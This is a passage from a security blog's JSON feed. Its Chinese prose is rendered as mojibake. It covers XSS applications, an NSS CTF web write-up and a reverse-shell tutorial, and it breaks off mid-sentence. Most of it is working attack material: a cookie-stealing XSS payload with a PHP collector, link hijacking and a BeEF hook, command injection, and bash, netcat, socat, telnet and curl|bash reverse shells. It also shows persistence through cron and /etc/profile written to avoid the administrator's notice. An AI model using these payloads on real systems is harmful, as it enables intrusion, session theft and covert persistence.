class=\"markdownIt-Anchor\" href=\"#style\">#</a> style</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;style Î¿nlÎ¿ad=alert(1)&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"åº”ç”¨\"><a class=\"markdownIt-Anchor\" href=\"#åº”ç”¨\">#</a> åº”ç”¨</h2>\n<h3 id=\"è·å–cookieè¿™é‡Œåå°„å‹ä¸ºä¾‹\"><a class=\"markdownIt-Anchor\" href=\"#è·å–cookieè¿™é‡Œåå°„å‹ä¸ºä¾‹\">#</a> è·å– cookie:(è¿™é‡Œåå°„å‹ä¸ºä¾‹)</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url?uname=&lt;script&gt;document.location=&quot;http://47.108.208.33/testxss/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br><span class=\"line\">document.locationæ˜¯é‡å®šå‘çš„æ„æ€</span><br><span class=\"line\"></span><br><span class=\"line\">vpsçš„cookie.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$cookie=$_GET[&#x27;cookie&#x27;];</span><br><span class=\"line\">file_put_contents(&#x27;cookie.txt&#x27;,$cookie);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>è¾“å…¥æ¶æ„è¿æ¥ä¼šè·³è½¬åˆ°é‚£ä¸ª url, å¹¶å°† cookie å†™è¿› cookie.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class=\"line\">scriptæ ‡ç­¾ä¹‹ä¸­å¯ä»¥è¾“å…¥ä»»æ„jsä»£ç ,rg</span><br><span class=\"line\">&lt;script&gt;console.log(&#x27;hacker&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"ç¯¡æ”¹æ¶æ„ç½‘é¡µé“¾æ¥ä»¥åå°„æ€§ä¸ºä¾‹\"><a class=\"markdownIt-Anchor\" href=\"#ç¯¡æ”¹æ¶æ„ç½‘é¡µé“¾æ¥ä»¥åå°„æ€§ä¸ºä¾‹\">#</a> ç¯¡æ”¹æ¶æ„ç½‘é¡µé“¾æ¥ (ä»¥åå°„æ€§ä¸ºä¾‹)</h3>\n<p>window.onload: å½“çª—å£åŠ è½½æ—¶ï¼Œæ‰§è¡ŒåŒ¿åå‡½æ•°</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"variable language_\">window</span>.<span class=\"property\">onload</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> link=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">&quot;a&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;link.<span class=\"property\">length</span>;j++)&#123;</span><br><span class=\"line\">link[j].<span class=\"property\">href</span>=<span class=\"string\">&quot;http://attacker-site.com/&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"beefæŒ‡å‘æ¶æ„é“¾æ¥\"><a class=\"markdownIt-Anchor\" href=\"#beefæŒ‡å‘æ¶æ„é“¾æ¥\">#</a> beef æŒ‡å‘æ¶æ„é“¾æ¥</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">beef -xss</span><br><span class=\"line\">åœ¨å­˜åœ¨xssçš„åœ°æ–¹è¾“å…¥ï¼š</span><br><span class=\"line\">&lt;script src=&quot;http://192.168.240.122:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">åœ¨beefå¯ä»¥çœ‹åˆ°ç›®æ ‡ä¸Šçº¿</span><br></pre></td></tr></table></figure>\n<p>æ¯”å¦‚æˆ‘è¿™é‡Œç”¨ kali å¼€å¯ beef-xssï¼ŒWindows ä¸»æœºå¼€ DVWAï¼Œåœ¨ kali ä¸»æœºç™»å½• DVWA åœ¨å­˜å‚¨å‹ xss æ’å…¥ hookï¼ŒWindows ä¸»æœºç™»å½• DVWA æµè§ˆ xssï¼ˆstoredï¼‰ï¼Œå¯ä»¥çœ‹åˆ° beef ä¸­å·²ç»è·å–äº† Windows çš„æµè§ˆå™¨çš„ä¿¡æ¯<br>\n<img data-src=\"https://s2.loli.net/2023/06/26/HBaDmdNzP465FLJ.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-26 193218.png\"><br>\n<img data-src=\"https://s2.loli.net/2023/06/26/E17AdK3IcD2UFWR.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-26 193222.png\"><br>\n<img data-src=\"https://s2.loli.net/2023/06/26/ezNSPEUfZtKXj3r.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-26 193635.png\"></p>\n<h3 id=\"ç›—å–ç”¨æˆ·ä¿¡æ¯\"><a class=\"markdownIt-Anchor\" href=\"#ç›—å–ç”¨æˆ·ä¿¡æ¯\">#</a> ç›—å–ç”¨æˆ·ä¿¡æ¯</h3>\n<p>setoolkit å·¥å…·å…‹éš†é’“é±¼ç½‘ç«™<br>\n xss payload:(ä»¥å­˜å‚¨å‹ä¸ºä¾‹)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;window.location=&quot;ip&quot;&lt;/script&gt;</span><br><span class=\"line\">è¿™é‡Œçš„IPæ˜¯ç”¨setoolkitä¼ªé€ çš„é¡µé¢çš„IP,æˆ‘è¿™é‡Œæ˜¯</span><br><span class=\"line\">&lt;script&gt;window.location=&quot;http://192.168.206.123/&quot;&lt;/script&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>åªè¦ç”¨æˆ·è®¿é—® kali æ”»å‡»æœºçš„åœ°å€å°±èƒ½çœ‹åˆ°ä¼ªé€ é¡µé¢ï¼Œæ­¤æ—¶ç”¨æˆ·çš„è¾“å…¥éƒ½è¢« kali ç›‘å¬åˆ°</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/23/NSS%20Round13/",
            "url": "https://hq185187.github.io/2023/06/23/NSS%20Round13/",
            "title": "NSS Round 13",
            "date_published": "2023-06-23T12:40:27.963Z",
            "content_html": "<h2 id=\"1flaskjwt\"><a class=\"markdownIt-Anchor\" href=\"#1flaskjwt\">#</a> 1.flask?jwt?</h2>\n<p>æ ¹æ®é¢˜ç›®æç¤ºå¯ä»¥çŒœå‡ºè¿™æ˜¯ flask session ä¼ªé€ é—®é¢˜<br>\nåœ¨å¿˜è®°å¯†ç çš„é¡µé¢æºä»£ç å‘ç° key</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- secretkey: th3f1askisfunny --&gt;</span><br></pre></td></tr></table></figure>\n<p>ç»è¿‡ç®€å•çš„ fuzz å¯ä»¥çŸ¥é“:</p>\n<ol>\n<li>admin å·²ç»è¢«æ³¨å†Œ</li>\n<li>åªæœ‰ admin å¯ä»¥æ‹¿ flag<br>\n æŠ“æ™®é€šç”¨æˆ·ç‚¹å‡»æ‹¿ flag çš„æ—¶å€™çš„åŒ…ï¼Œå¼€å§‹ä¼ªé€  session:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python flask_session_cookie_manager3.py decode -c &#x27;ä½ çš„session&#x27; -s &#x27;th3f1askisfunny&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">å¯ä»¥çœ‹æ­¤æ—¶çš„_user_idæ˜¯2,adminåº”è¯¥æ˜¯1,æ”¹æˆ1åŠ å¯†</span><br><span class=\"line\"></span><br><span class=\"line\">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;d58a3e83c73f903728231612f76290dfc46bf8b4ffa32c0c824e0cb6a54c459891ea2fc13e9cfbef830b8becebbd152e9b0f5039ff3a09f94be96dac53dec926&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot; -s &#x27;th3f1askisfunny&#x27;</span><br></pre></td></tr></table></figure>\n<p>å°†å¾—åˆ°çš„æ–° session æ”¹å˜ä¸€ä¸‹å¾— flag<br>\n<img data-src=\"https://s2.loli.net/2023/06/23/wOxmQsfUvelYBhz.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-23 153546.png\"></p>\n<h2 id=\"2flaskjwthard\"><a class=\"markdownIt-Anchor\" href=\"#2flaskjwthard\">#</a> 2.flask?jwt?(hard)</h2>\n<p>è¿™é¢˜æŠŠ key è—èµ·æ¥äº†ï¼Œæ³¨å†Œç™»å½•åçœ‹åŸä»£ç æç¤º /wor è·¯ç”±ï¼Œè®¿é—®ç»™äº†ç™»å½•æ—¶é—´ï¼Œ<mark> å›åˆ°ç™»å½•è¿™é‡ŒæŠŠ session éšä¾¿åˆ é™¤ä¸€ç‚¹å°±èƒ½çœ‹åˆ° debug æ¨¡å¼å›æ˜¾ 302, å¯¹å›æ˜¾çš„ session è¿›è¡Œ base64 è§£ç å‘ç°æ˜¯è¿›å…¥çš„æç¤ºè¯­å¥</mark>ï¼Œäºæ˜¯åœ¨ /wor è·¯ç”±æŠŠ session ä¹Ÿéšä¾¿åˆ ç‚¹ï¼Œå¯ä»¥çœ‹åˆ° key</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.secret_key = &#x27;hardgam3_C0u1d_u_f1ndM3????&#x27;;</span><br></pre></td></tr></table></figure>\n<p>ä¹‹åçš„åšæ³•å’Œç¬¬ä¸€é¢˜ä¸€æ ·ä¼ªé€  session å°±è¡Œäº†</p>\n<h2 id=\"3ä¿¡æ¯æ”¶é›†\"><a class=\"markdownIt-Anchor\" href=\"#3ä¿¡æ¯æ”¶é›†\">#</a> 3. ä¿¡æ¯æ”¶é›†</h2>\n<p>æ”¶é›†åˆ° index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;   Â Â Â Â <span class=\"keyword\">echo</span><span class=\"title function_ invoke__\">Â file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);   &#125;   <span class=\"keyword\">else</span>&#123;Â Â Â Â <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);   &#125;   <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>dirsearch æ‰«åˆ° index.php, æ­¤æ—¶æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–ç‚¹ï¼Œé€šè¿‡é¢˜ç›®æç¤ºä¿¡æ¯æ”¶é›†å’Œå›æ˜¾çš„ <code>Server: Apache/2.4.55 (Unix)</code> <br>\n æ‰¾åˆ°äº†<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTIzNDU=\"> CVE-2023-25690</span><br>\n è¯»å– <code>/usr/local/apache2/conf/httpd.conf</code> ï¼Œå¾—åˆ°ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RewriteEngine on RewriteRule &quot;^/nssctf/(.*)&quot; &quot;http://backend-server:8080/index.php?id=$1&quot; [P] ProxyPassReverse &quot;/nssctf/&quot; &quot;http://backend-server:8080/&quot;</span><br></pre></td></tr></table></figure>\n<p>å†ä¿®æ”¹å§¿åŠ¿ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/nssctf/abc%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/flag.txt</span><br></pre></td></tr></table></figure>\n<h2 id=\"4ez_factors\"><a class=\"markdownIt-Anchor\" href=\"#4ez_factors\">#</a> 4.ez_factors</h2>\n<p>ç‚¹å‡» Tool ç›´æ¥è·³è½¬ factors/114514<br>\n æ­¤æ—¶é¡µé¢ä¹Ÿæœ‰ 114514ï¼Œè¯•è¯•å‘½ä»¤æ‰§è¡Œ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/factors/114514|echo 666</span><br><span class=\"line\">è¾“å‡ºäº†666</span><br><span class=\"line\">ç›´æ¥åå¼¹shell,è¿™é‡Œ</span><br><span class=\"line\">/factors/114514|bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><br><span class=\"line\">å’Œ</span><br><span class=\"line\">/factors/114514|bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class=\"line\">éƒ½ä¼šå¤±è´¥</span><br></pre></td></tr></table></figure>\n<p>ç”¨ base64 åŠ å¯†æ‰§è¡Œï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/factors/114514|echo [è¿™é‡Œæ˜¯åå¼¹shellbase64åŠ å¯†åçš„å†…å®¹]|base64 -d|bash</span><br></pre></td></tr></table></figure>\n<p>ç›´æ¥ cat /flag</p>\n<h2 id=\"5myweb\"><a class=\"markdownIt-Anchor\" href=\"#5myweb\">#</a> 5.MyWeb</h2>\n<p>æºç ï¼š<br>\n<img data-src=\"https://s2.loli.net/2023/06/23/n61TJxSUbLIyFRq.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-23 192202.png\"><br>\n é¢˜ç›®å°† <code>]</code>  æ›¿æ¢æˆ <code>, $value]</code> <br>\n çŒœæµ‹ json æ–‡ä»¶çš„ç»“æ„æ˜¯ï¼š<br>\n <code>[1,2,3,4,...]</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">å‡è®¾å®ƒçš„ç»“æ„æ˜¯[1,2,3]</span><br><span class=\"line\">æ¯”å¦‚æˆ‘ä»¬è¾“å…¥ä¸€ä¸ª];666</span><br><span class=\"line\">ç»“æ„å˜æˆï¼š</span><br><span class=\"line\">[1,2,3, ];666]</span><br><span class=\"line\">æ„é€ payloadé—­åˆ[]:</span><br><span class=\"line\"></span><br><span class=\"line\">];%0aecho `cat /flag`;%0a[</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?mode=save&amp;&amp;value=];%0aecho `cat /flag`;%0a[</span><br><span class=\"line\"></span><br><span class=\"line\">?mode=read</span><br></pre></td></tr></table></figure>\n<h2 id=\"6timetrcer\"><a class=\"markdownIt-Anchor\" href=\"#6timetrcer\">#</a> 6.TimeTrcer</h2>\n<p>æœ‰ç‚¹éš¾ï¼Œåé¢çœ‹</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/",
            "url": "https://hq185187.github.io/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/",
            "title": "åå¼¹shellå­¦ä¹ ",
            "date_published": "2023-06-21T13:44:24.210Z",
            "content_html": "<h3 id=\"ä»€ä¹ˆæ˜¯åå¼¹shell\"><a class=\"markdownIt-Anchor\" href=\"#ä»€ä¹ˆæ˜¯åå¼¹shell\">#</a> ä»€ä¹ˆæ˜¯åå¼¹ shell</h3>\n<p>reverse shell, å°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸ TCP/UDP ç«¯å£ï¼Œè¢«æ§ç«¯è¯·æ±‚åˆ°è¯¥æ§åˆ¶ç«¯ç«¯å£ï¼Œå¹¶å°†ç¥ºå‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯</p>\n<h3 id=\"ä»€ä¹ˆæ—¶å€™ç”¨\"><a class=\"markdownIt-Anchor\" href=\"#ä»€ä¹ˆæ—¶å€™ç”¨\">#</a> ä»€ä¹ˆæ—¶å€™ç”¨ï¼Ÿ</h3>\n<p>é€šå¸¸ç”¨äºè¢«æ§ç«¯é˜²ç«å¢™å—é™ï¼Œæƒé™ä¸è¶³ï¼Œç«¯å£è¢«å ç”¨ç­‰æƒ…å½¢<br>\nå‡è®¾æˆ‘ä»¬æ”»å‡»äº†ä¸€å°æœºå™¨ï¼Œæ‰“å¼€äº†è¯¥æœºå™¨çš„ä¸€ä¸ªç«¯å£ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è‡ªå·±çš„æœºå™¨å»è¿æ¥ç›®æ ‡æœºå™¨ï¼Œè¿™ç§å«æ­£å‘è¿æ¥ï¼Œè¿œç¨‹æ¡Œé¢ï¼Œweb æœåŠ¡ï¼Œsshï¼Œtelnet ç­‰ç­‰<br>\nä½†æ˜¯ä»¥ä¸‹æƒ…å†µï¼š</p>\n<ol>\n<li>å®¢æˆ·æœºä¸­äº†ä½ çš„é©¬ï¼Œä½†æ˜¯åœ¨å±€åŸŸç½‘å†…</li>\n<li>å®ƒçš„ ip ä¼šåŠ¨æ€æ”¹å˜ï¼Œä¸èƒ½æŒç»­æ§åˆ¶</li>\n<li>é˜²ç«å¢™é™åˆ¶ï¼Œå¯¹æ–¹åªèƒ½å‘é€è¯·æ±‚ï¼Œä¸èƒ½æ¥æ”¶è¯·æ±‚<br>\næ­¤æ—¶åªèƒ½åå¼¹ shellï¼Œå°±æ˜¯æ”»å‡»è€…æŒ‡å®šæœåŠ¡å™¨ï¼Œå—å®³è€…ä¸»æœºä¸»åŠ¨è¿æ¥æ”»å‡»è€…çš„æœåŠ¡ç«¯ç¨‹åº</li>\n</ol>\n<p>ç¯å¢ƒï¼š<br>\n192.168.81.122ï¼ˆkali æ”»å‡»æœºï¼‰<br>\n192.168.81.113  ubuntu)</p>\n<h3 id=\"netcatåå¼¹shell\"><a class=\"markdownIt-Anchor\" href=\"#netcatåå¼¹shell\">#</a> netcat åå¼¹ shell</h3>\n<p>Linux é»˜è®¤å¸¦ netcat ä½†æ˜¯ä¸ºäº†å®‰å…¨è€ƒè™‘æŠŠåå¼¹ shell çš„ - e ç»™åˆ äº†</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class=\"line\">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make &amp;&amp; make install</span><br><span class=\"line\">make clean</span><br></pre></td></tr></table></figure>\n<p>æ”»å‡»æœºå¼€å¯ç›‘å¬ï¼š<br>\nnetcat -lvnp 23333<br>\n ç›®æ ‡æœºä¸»åŠ¨è¿æ¥ï¼š<br>\nnetcat  192.168.81.122 23333 -e /bin/bash<br>\n<img data-src=\"https://s2.loli.net/2023/06/21/xYqT8Eb9t1OXUkZ.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-21 183357.png\"></p>\n<h3 id=\"åˆ©ç”¨bashåå¼¹shell\"><a class=\"markdownIt-Anchor\" href=\"#åˆ©ç”¨bashåå¼¹shell\">#</a> åˆ©ç”¨ bash åå¼¹ shell</h3>\n<p>å¸¸ç”¨:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>\n<p>è§£æ:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i äº§ç”Ÿä¸€ä¸ªbashäº¤äº’ç¯å¢ƒ</span><br><span class=\"line\">&gt;&amp;    å°†è”åˆç¬¦å·å‰é¢çš„å†…å®¹ä¸åé¢ç›¸ç»“åˆï¼Œç„¶åä¸€èµ·é‡å®šå‘ç»™åè€…ã€‚</span><br><span class=\"line\">/dev/tcp/ip/port  è®©ç›®æ ‡ä¸»æœºä¸æ”»å‡»æœºipçš„portç«¯å£å»ºç«‹ä¸€ä¸ªtcpè¿æ¥</span><br><span class=\"line\">0&gt;&amp;1  å°†æ ‡å‡†è¾“å…¥ä¸è¾“å‡ºçš„å†…å®¹ç›¸ç»“åˆ,ç„¶åé‡å®šå‘åˆ°å‰é¢æ ‡å‡†è¾“å‡ºçš„å†…å®¹</span><br></pre></td></tr></table></figure>\n<p>å®æ“:<br>\nkali:<br>\nnc -lvnp 23333<br>\nubuntu:<br>\nbash -i &gt;&amp; /dev/tcp/192.168.81.122/23333 0&gt;&amp;1</p>\n<p><img data-src=\"https://s2.loli.net/2023/06/21/Pog29TSt4VZ5zbM.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-21 185633.png\"></p>\n<h3 id=\"curlé…åˆbashåå¼¹shell\"><a class=\"markdownIt-Anchor\" href=\"#curlé…åˆbashåå¼¹shell\">#</a> Curl é…åˆ Bash åå¼¹ shell</h3>\n<p>åœ¨ kali çš„ www ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª index.php æˆ–è€… index.html</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.81.122/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>Ubuntu:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 192.168.81.122|bash</span><br></pre></td></tr></table></figure>\n<h3 id=\"åå¼¹shellå†™è¿›å®šæ—¶ä»»åŠ¡\"><a class=\"markdownIt-Anchor\" href=\"#åå¼¹shellå†™è¿›å®šæ—¶ä»»åŠ¡\">#</a> åå¼¹ shell å†™è¿›å®šæ—¶ä»»åŠ¡</h3>\n<p>å‡è®¾å½“å‰ç”¨æˆ·åä¸º root,centos ä¸»æœºå†™è¿›Â /var/spool/cron/root,Ubuntu/Debian ä¸»æœºå†™è¿› /var/spool/cron/crontabs/root ä¸­</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">#æ¯éš”ä¸€åˆ†é’Ÿï¼Œå‘47.xxx.xxx.72çš„2333å·ç«¯å£å‘é€shell</span><br></pre></td></tr></table></figure>\n<p>åå¼¹ shell å‘½ä»¤å†™è¿› /etc/profile æ–‡ä»¶<br>\n /etc/profile æ–‡ä»¶çš„å†…å®¹ä¼šåœ¨ç”¨æˆ·æ‰“å¼€ bash çª—å£çš„æ—¶å€™æ‰§è¡Œ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1 &amp;</span><br><span class=\"line\"># æœ€åé¢é‚£ä¸ª&amp;ä¸ºçš„æ˜¯é˜²æ­¢ç®¡ç†å‘˜æ— æ³•è¾“å…¥å‘½ä»¤</span><br></pre></td></tr></table></figure>\n<p>å½“ç›®æ ‡ä¸»æœºç®¡ç†å‘˜è¿œç¨‹è¿æ¥è¯¥ä¸»æœºæ—¶ï¼Œå°±ä¼šæˆåŠŸæ‰§è¡Œ shell å‘½ä»¤</p>\n<h3 id=\"åˆ©ç”¨socatåå¼¹shell\"><a class=\"markdownIt-Anchor\" href=\"#åˆ©ç”¨socatåå¼¹shell\">#</a> åˆ©ç”¨ Socat åå¼¹ shell</h3>\n<p>Socat åŠŸèƒ½ä¸ netcat ç±»ä¼¼ï¼Œæ®è¯´æ˜¯ netcat çš„åŠ å¼ºç‰ˆ<br>\nä½¿ç”¨:<br>\nkali</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socat TCP-LISTEN:2333 -</span><br><span class=\"line\">æˆ–è€…</span><br><span class=\"line\">nc -lvnp 2333</span><br></pre></td></tr></table></figure>\n<p>ubuntu<br>\n å®‰è£…:apt install socat</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socat tcp-connect:192.168.81.122:2333 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>\n<p>ç»“æœ:<br>\n<img data-src=\"https://s2.loli.net/2023/06/21/NscbIgO2WjiSGMU.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-21 202214.png\"></p>\n<p><img data-src=\"https://s2.loli.net/2023/06/21/y2zbgodxYUOIHfC.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-21 202241.png\"></p>\n<h3 id=\"åˆ©ç”¨telnetåå¼¹shell\"><a class=\"markdownIt-Anchor\" href=\"#åˆ©ç”¨telnetåå¼¹shell\">#</a> åˆ©ç”¨ Telnet åå¼¹ shell</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 2333(kali)</span><br><span class=\"line\"></span><br><span class=\"line\">mknod a p; telnet 192.168.81.122 2333 0&lt;a | /bin/bash 1&gt;a</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://s2.loli.net/2023/06/21/qXZ5NnMIYGamDUA.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-21 202723.png\"><br>\n<img data-src=\"https://s2.loli.net/2023/06/21/n1tvjUQyO2lBwz9.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-21 202732.png\"></p>\n<h3 id=\"å„ç§è„šæœ¬æ‰§è¡Œåå¼¹shell\"><a class=\"markdownIt-Anchor\" href=\"#å„ç§è„šæœ¬æ‰§è¡Œåå¼¹shell\">#</a> å„ç§è„šæœ¬æ‰§è¡Œåå¼¹ shell</h3>\n<h4 id=\"pythonè„šæœ¬åå¼¹shell\"><a class=\"markdownIt-Anchor\" href=\"#pythonè„šæœ¬åå¼¹shell\">#</a> python è„šæœ¬åå¼¹ shell</h4>\n<p>å½“ç›®æ 